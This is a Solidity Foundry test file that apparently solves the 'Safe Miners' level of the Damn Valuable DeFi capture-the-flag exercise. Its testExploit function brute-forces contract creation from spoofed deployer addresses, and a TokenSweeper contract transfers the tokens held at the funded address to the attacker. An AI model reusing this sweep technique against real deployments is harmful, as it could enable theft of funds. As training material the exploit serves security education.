// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "gnosis/GnosisSafe.sol";
import "gnosis/proxies/GnosisSafeProxy.sol";
import "gnosis/proxies/GnosisSafeProxyFactory.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract SafeMiners is Test {
    uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
    address internal constant DEPOSIT_ADDRESS = 0x79658d35aB5c38B6b988C23D02e0410A380B8D5c;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        // Deploy Damn Valuable Token contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deposit the DVT tokens to the address
        dvt.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(dvt.balanceOf(attacker), 0);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        address proxy = 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B;
        address master = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
        GnosisSafe masterCopy = new GnosisSafe();

        GnosisSafeProxyFactory walletFactory = new GnosisSafeProxyFactory();

        vm.prank(address(masterCopy));
        new JuniorMinersExploit(attacker, dvt, 100);

        vm.prank(address(walletFactory));
        new JuniorMinersExploit(attacker, dvt, 100);

        vm.prank(master);
        new JuniorMinersExploit(attacker, dvt, 100);

        vm.prank(proxy);
        new JuniorMinersExploit(attacker, dvt, 100);

        vm.prank(attacker);
        new JuniorMinersExploit(attacker, dvt, 100);

        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        // The attacker took all tokens available in the deposit address
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(dvt.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
    }
}

contract JuniorMinersExploit {
    constructor(address attacker, IERC20 token, uint256 nonces) {
        for (uint256 idx; idx < nonces; idx++) {
            new TokenSweeper(attacker, token);
        }
    }
}

contract TokenSweeper {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
